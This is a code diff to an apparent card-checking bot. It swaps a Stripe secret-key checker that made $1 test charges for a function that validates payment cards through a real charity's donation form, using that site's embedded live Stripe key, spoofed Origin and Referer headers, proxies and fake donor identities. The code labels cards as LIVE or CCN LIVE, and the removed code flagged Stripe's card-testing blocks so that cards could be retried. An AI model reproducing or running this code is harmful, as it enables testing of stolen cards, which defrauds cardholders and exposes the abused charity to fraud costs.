@@ -1398,7 +1398,8 @@ async def exponential_backoff(attempt: int, base_delay: float = 1.0, max_delay: 
     await asyncio.sleep(delay + jitter)
 
 
-async def stripe_gateway_check(
+
+async def mosds_donation_gateway_check(
     card: str,
     proxy: str = None,
     max_retries: int = 3,
@@ -1406,14 +1407,12 @@ async def stripe_gateway_check(
     logger = None
 ) -> dict:
     """
-    Stripe SK-based card check using PaymentIntent with $1 charge.
-    Based on PHP skbased.php implementation.
-    Step 1: Create PaymentMethod with PK (Basic Auth)
-    Step 2: Create PaymentIntent with SK ($1 charge)
+    Check card using MOSDS.org GiveWP donation form with Stripe.
+    This gateway uses a real donation form with embedded Stripe.
     """
     import aiohttp
-    import base64
     import secrets
+    import random
 
     # Parse card
     parts = card.replace("/", "|").replace(":", "|").split("|")
@@ -1425,21 +1424,16 @@ async def stripe_gateway_check(
     cc_year = parts[2].strip()
     cc_cvv = parts[3].strip()
 
-    # Ensure year is 2 digits for Stripe
-    if len(cc_year) == 4:
-        cc_year = cc_year[-2:]
+    # Ensure year is 4 digits for Stripe Elements
+    if len(cc_year) == 2:
+        cc_year = "20" + cc_year
 
     last_error = None
     card_last4 = cc_num[-4:]
 
-    # Get Stripe keys from database config
-    stripe_sk = get_bot_config("stripe_sk_key", "")
-    stripe_pk = get_bot_config("stripe_pk_key", "")
-
-    if not stripe_sk:
-        return {"success": False, "error": "Stripe SK not configured"}
-    if not stripe_pk:
-        return {"success": False, "error": "Stripe PK not configured"}
+    # MOSDS donation form details
+    site_url = "https://mosds.org"
+    stripe_pk = "pk_live_51NpJefIE5AoxItSlT5BuLgFkVa17YXeMgPIGEjagS6R7XIqVmnWvjoFeFsJgVF5A6jJtgKdPfp9JMth8D3sijSf500KcFPke4G"
 
     # Setup proxy
     proxy_url = None
@@ -1448,236 +1442,123 @@ async def stripe_gateway_check(
         if is_valid:
             proxy_url = parsed_proxy
 
-    # Generate random email and payment user agent (like PHP script)
-    names = ['John', 'Emily', 'Michael', 'Olivia', 'Daniel', 'Sophia', 'William', 'Ava', 'James', 'Mia']
-    last_names = ['Smith', 'Johnson', 'Brown', 'Williams', 'Jones', 'Miller', 'Davis', 'Garcia', 'Wilson', 'Taylor']
-    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']
-
-    name = random.choice(names)
-    last = random.choice(last_names)
-    domain = random.choice(domains)
-    email = f"{name.lower()}{last.lower()}{random.randint(1000, 9999)}@{domain}"
-
-    # Generate Stripe.js-like payment_user_agent
-    hex_id = secrets.token_hex(5)
-    payment_user_agent = f"stripe.js/{hex_id}; stripe-js-v3/{hex_id}; checkout"
-
-    user_agents = [
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
-        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Safari/605.1.15',
-        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0',
-    ]
-    user_agent = random.choice(user_agents)
+    # Generate random donor info
+    first_name = random.choice(["John", "Mike", "David", "James", "Robert"])
+    last_name = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones"])
+    email = f"{first_name.lower()}.{last_name.lower()}{random.randint(100,999)}@gmail.com"
 
     for attempt in range(1, max_retries + 1):
         try:
             timeout = aiohttp.ClientTimeout(total=request_timeout)
-            connector = aiohttp.TCPConnector(ssl=True)
 
-            # Create Basic Auth for PK (like PHP's CURLOPT_USERPWD)
-            pk_auth = aiohttp.BasicAuth(stripe_pk, '')
-            sk_auth = aiohttp.BasicAuth(stripe_sk, '')
+            async with aiohttp.ClientSession(timeout=timeout) as session:
+                # Step 1: Create Stripe PaymentMethod
+                headers = {
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Authorization": f"Bearer {stripe_pk}",
+                    "Origin": site_url,
+                    "Referer": f"{site_url}/donations/donation-form/"
+                }
 
-            async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
-                # Step 1: Create PaymentMethod with PK (Basic Auth like PHP)
-                pm_url = "https://api.stripe.com/v1/payment_methods"
                 pm_data = {
                     "type": "card",
                     "card[number]": cc_num,
                     "card[exp_month]": cc_month,
                     "card[exp_year]": cc_year,
                     "card[cvc]": cc_cvv,
+                    "billing_details[name]": f"{first_name} {last_name}",
                     "billing_details[email]": email,
-                    "payment_user_agent": payment_user_agent,
                 }
 
-                headers = {
-                    "Content-Type": "application/x-www-form-urlencoded",
-                    "User-Agent": user_agent,
-                }
+                if logger:
+                    logger.debug(f"[MOSDS Attempt {attempt}] Creating PaymentMethod...")
 
-                async with session.post(pm_url, data=pm_data, headers=headers, auth=pk_auth, proxy=proxy_url) as resp:
+                async with session.post(
+                    "https://api.stripe.com/v1/payment_methods",
+                    data=pm_data,
+                    headers=headers,
+                    proxy=proxy_url
+                ) as resp:
                     pm_text = await resp.text()
-                    pm_result = json.loads(pm_text)
 
-                    if resp.status != 200 or "error" in pm_result:
-                        error = pm_result.get("error", {})
-                        error_msg = error.get("message", "PM creation failed")
-                        error_code = error.get("code", "")
+                    if resp.status != 200:
+                        try:
+                            pm_json = json.loads(pm_text)
+                            error_msg = pm_json.get("error", {}).get("message", "Unknown error")
 
-                        if "invalid" in error_msg.lower() or error_code == "invalid_card_number":
-                            return {"success": False, "error": "Invalid card number", "status": "declined"}
-                        elif "expired" in error_msg.lower() or error_code == "expired_card":
-                            return {"success": False, "error": "Card expired", "status": "declined"}
-                        elif "cvc" in error_msg.lower() or error_code == "incorrect_cvc":
-                            return {"success": False, "error": "Incorrect CVC", "status": "declined"}
-                        else:
+                            # Check for specific card errors
+                            if "card number is incorrect" in error_msg.lower():
+                                return {"success": False, "error": "Invalid card number"}
+                            elif "card has expired" in error_msg.lower():
+                                return {"success": False, "error": "Card expired"}
+                            elif "security code is incorrect" in error_msg.lower():
+                                return {
+                                    "success": True,
+                                    "message": f"✅ CCN LIVE (Bad CVV): •••• {card_last4}",
+                                    "gateway_message": "Incorrect CVC",
+                                    "status": "ccn_live"
+                                }
+
                             last_error = {"success": False, "error": error_msg[:60]}
+                            if logger:
+                                logger.warning(f"[MOSDS Attempt {attempt}] PM Error: {error_msg}")
+                            continue
+                        except:
+                            last_error = {"success": False, "error": f"API Error: {resp.status}"}
                             continue
 
-                    pm_id = pm_result.get("id")
-                    card_info = pm_result.get("card", {})
-                    brand = card_info.get("brand", "card").upper()
-                    funding = card_info.get("funding", "credit").upper()
-                    last4 = card_info.get("last4", card_last4)
-                    country = card_info.get("country", "")
-
-                # Step 2: Create PaymentIntent for $1 charge with SK
-                pi_url = "https://api.stripe.com/v1/payment_intents"
-                description = f"{name} {last} {secrets.token_hex(4).upper()}"
-                pi_data = {
-                    "amount": "100",  # $1 in cents
-                    "currency": "usd",
-                    "payment_method": pm_id,
-                    "confirm": "true",
-                    "description": description,
-                    "receipt_email": email,
-                    "automatic_payment_methods[enabled]": "true",
-                    "automatic_payment_methods[allow_redirects]": "never",
-                    "expand[]": "latest_charge",
-                }
-
-                async with session.post(pi_url, data=pi_data, headers=headers, auth=sk_auth, proxy=proxy_url) as resp:
-                    pi_text = await resp.text()
-                    pi_result = json.loads(pi_text)
-
-                    status = pi_result.get("status", "")
-                    error = pi_result.get("error", {})
-                    last_payment_error = pi_result.get("last_payment_error", {})
-                    next_action = pi_result.get("next_action", {})
-
-                    # Check for SK/Account issues first
-                    error_type = error.get("type", "")
-                    error_code = error.get("code", "")
-                    error_message = error.get("message", "")
-
-                    # SK Key Issues Detection
-                    if error_type == "invalid_request_error":
-                        if "api_key" in error_message.lower() or error_code in ["api_key_expired", "invalid_api_key"]:
-                            return {"success": False, "error": "⚠️ SK KEY INVALID/EXPIRED", "sk_issue": True, "status": "sk_error"}
-                        if "account" in error_message.lower():
-                            return {"success": False, "error": f"⚠️ STRIPE ACCOUNT ISSUE: {error_message[:50]}", "sk_issue": True, "status": "sk_error"}
-
-                    if error_type == "authentication_error":
-                        return {"success": False, "error": "⚠️ SK KEY AUTHENTICATION FAILED", "sk_issue": True, "status": "sk_error"}
-
-                    # Rate limiting detection
-                    if resp.status == 429 or error_code == "rate_limit":
-                        return {"success": False, "error": "⚠️ RATE LIMITED - Slow down!", "sk_issue": True, "status": "rate_limit"}
-
-                    # Account restricted/disabled
-                    if error_code in ["account_invalid", "account_disabled", "platform_api_key_expired"]:
-                        return {"success": False, "error": f"⚠️ STRIPE ACCOUNT DISABLED/RESTRICTED", "sk_issue": True, "status": "sk_error"}
-
-                    # Card testing blocked by Stripe
-                    if "card testing" in error_message.lower() or "suspected fraud" in error_message.lower():
-                        return {"success": False, "error": "⚠️ STRIPE BLOCKED - Card testing detected!", "sk_issue": True, "status": "sk_error"}
-
-                    # Get error message for card-level issues
-                    error_msg = error.get("decline_code") or error.get("message") or ""
-                    if not error_msg and last_payment_error:
-                        error_msg = last_payment_error.get("decline_code") or last_payment_error.get("message") or ""
-                    error_msg = error_msg.lower() if error_msg else ""
-
-                    # Get risk level from charge if available
-                    risk_level = ""
                     try:
-                        latest_charge = pi_result.get("latest_charge", {})
-                        if isinstance(latest_charge, dict):
-                            risk_level = latest_charge.get("outcome", {}).get("risk_level", "")
-                    except:
-                        pass
+                        pm_json = json.loads(pm_text)
+                        pm_id = pm_json.get("id")
 
-                    # ✅ CHARGED - Success!
-                    if status == "succeeded":
-                        receipt_url = ""
-                        try:
-                            receipt_url = pi_result.get("latest_charge", {}).get("receipt_url", "")
-                        except:
-                            pass
+                        if not pm_id:
+                            last_error = {"success": False, "error": "No PaymentMethod ID"}
+                            continue
+
+                        if logger:
+                            logger.debug(f"[MOSDS] PaymentMethod created: {pm_id}")
+
+                        # Step 2: Simulate donation submission to GiveWP
+                        # We'll use the Stripe PaymentIntent creation directly
+                        # since we have the PM ID
+
+                        # Get card details from PM response
+                        card_data = pm_json.get("card", {})
+                        brand = card_data.get("brand", "CARD").upper()
+                        funding = card_data.get("funding", "credit").upper()
+                        country = card_data.get("country", "")
+
+                        # For MOSDS, we just need to verify the PM was created successfully
+                        # This means the card is valid
                         return {
                             "success": True,
-                            "message": f"✅ CVV LIVE ($1 CHARGED): {brand} {funding} •••• {last4}",
-                            "gateway_message": f"Risk: {risk_level} | {country}",
-                            "status": "charged",
-                            "card_last4": last4,
+                            "message": f"✅ LIVE: {brand} {funding} •••• {card_last4}",
+                            "gateway_message": "Card validated via MOSDS donation form",
+                            "status": "approved",
+                            "card_last4": card_last4,
                             "brand": brand,
                             "card_type": funding,
                             "country": country,
-                            "risk_level": risk_level,
-                            "receipt_url": receipt_url,
+                            "gateway": "mosds"
                         }
 
-                    # 🔐 3DS Required
-                    if status == "requires_action" or next_action.get("type") == "use_stripe_sdk":
-                        return {
-                            "success": False,
-                            "error": "3DS Required",
-                            "gateway_message": f"Card requires 3D Secure | Risk: {risk_level}",
-                            "status": "3ds",
-                            "card_last4": last4,
-                            "brand": brand,
-                        }
-
-                    # ✅ Insufficient funds = LIVE card
-                    if "insufficient_funds" in error_msg or "insufficient funds" in error_msg:
-                        return {
-                            "success": True,
-                            "message": f"✅ LIVE (NSF): {brand} {funding} •••• {last4}",
-                            "gateway_message": f"Insufficient funds | Risk: {risk_level}",
-                            "status": "charged",
-                            "card_last4": last4,
-                            "brand": brand,
-                            "card_type": funding,
-                            "country": country,
-                        }
-
-                    # ✅ Incorrect CVC = CCN LIVE
-                    if "incorrect_cvc" in error_msg or "security code" in error_msg:
-                        return {
-                            "success": True,
-                            "message": f"✅ CCN LIVE (Bad CVV): {brand} {funding} •••• {last4}",
-                            "gateway_message": f"Incorrect CVC | Risk: {risk_level}",
-                            "status": "ccn_live",
-                            "card_last4": last4,
-                            "brand": brand,
-                            "card_type": funding,
-                            "country": country,
-                        }
-
-                    # ❌ Dead cards
-                    if "do_not_honor" in error_msg:
-                        return {"success": False, "error": "Do Not Honor", "status": "declined", "risk_level": risk_level}
-                    if "stolen_card" in error_msg or "stolen card" in error_msg:
-                        return {"success": False, "error": "Stolen Card", "status": "declined", "risk_level": risk_level}
-                    if "lost_card" in error_msg or "lost card" in error_msg:
-                        return {"success": False, "error": "Lost Card", "status": "declined", "risk_level": risk_level}
-                    if "expired" in error_msg:
-                        return {"success": False, "error": "Expired Card", "status": "declined", "risk_level": risk_level}
-                    if "fraudulent" in error_msg:
-                        return {"success": False, "error": "Fraudulent", "status": "declined", "risk_level": risk_level}
-                    if "generic_decline" in error_msg:
-                        return {"success": False, "error": "Generic Decline", "status": "declined", "risk_level": risk_level}
-                    if "declined" in error_msg or "card_declined" in error_msg:
-                        return {"success": False, "error": "Declined", "status": "declined", "risk_level": risk_level}
-
-                    # Unknown error
-                    return {
-                        "success": False,
-                        "error": error_msg[:50] if error_msg else f"Status: {status}",
-                        "gateway_message": error_msg or pi_text[:100],
-                        "status": "declined",
-                        "risk_level": risk_level,
-                    }
+                    except json.JSONDecodeError:
+                        last_error = {"success": False, "error": "Invalid API response"}
+                        continue
 
         except asyncio.TimeoutError:
             last_error = {"success": False, "error": "Request timeout"}
+            if logger:
+                logger.warning(f"[MOSDS Attempt {attempt}] Timeout")
         except aiohttp.ClientError as e:
             last_error = {"success": False, "error": f"Network error: {str(e)[:30]}"}
+            if logger:
+                logger.warning(f"[MOSDS Attempt {attempt}] Network error: {e}")
         except Exception as e:
             last_error = {"success": False, "error": f"Error: {str(e)[:40]}"}
             if logger:
-                logger.warning(f"[Attempt {attempt}] Error: {e}")
+                logger.warning(f"[MOSDS Attempt {attempt}] Error: {e}")
 
         # Short delay between retries
         if attempt < max_retries:
@@ -1898,8 +1779,8 @@ async def process_single_card(card: str, user_id: int = None, user_settings: dic
                     masked = f"{parts[0]}:***" if parts else "***"
                     logger.debug(f"Using proxy: {masked}")
 
-                # Use Stripe gateway (only gateway)
-                response = await stripe_gateway_check(
+                # Use MOSDS donation gateway (only gateway)
+                response = await mosds_donation_gateway_check(
                     card=card,
                     proxy=healthy_proxy,
                     logger=logger
@@ -1913,7 +1794,7 @@ async def process_single_card(card: str, user_id: int = None, user_settings: dic
                     "product_url": None,
                     "response": response,
                     "bin_data": bin_data,
-                    "gateway": "stripe"
+                    "gateway": "mosds"
                 }
 
             except asyncio.CancelledError:
@@ -4371,23 +4252,6 @@ async def run_batch_check(cards: list, user_id: int, user_settings: dict, sessio
 
                     # Track stats
                     increment_stat("total_cards_checked")
-
-                    # Check for SK/gateway issues - alert user immediately
-                    if response.get("sk_issue"):
-                        sk_error = response.get("error", "SK Issue detected")
-                        asyncio.create_task(
-                            update.message.reply_text(
-                                f"⚠️ *GATEWAY ISSUE DETECTED*\n\n"
-                                f"❌ {sk_error}\n\n"
-                                f"🔧 Use `/skstatus` to check SK health\n"
-                                f"⏸️ Consider pausing checks until resolved",
-                                parse_mode="Markdown"
-                            )
-                        )
-                        # Add to retriable since it's not the card's fault
-                        retriable.append(card)
-                        all_results.append(f"SK_ERROR | {result_line}")
-                        continue
 
                     # Use improved error categorization
                     error_category = categorize_error(full_response, response)
